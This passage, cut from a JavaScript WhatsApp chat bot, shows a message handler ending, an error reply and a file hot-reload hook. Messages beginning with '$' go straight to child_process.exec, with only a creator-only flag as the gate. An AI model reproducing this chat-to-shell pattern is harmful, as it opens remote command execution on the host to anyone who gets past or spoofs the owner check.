if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRil(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ril.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\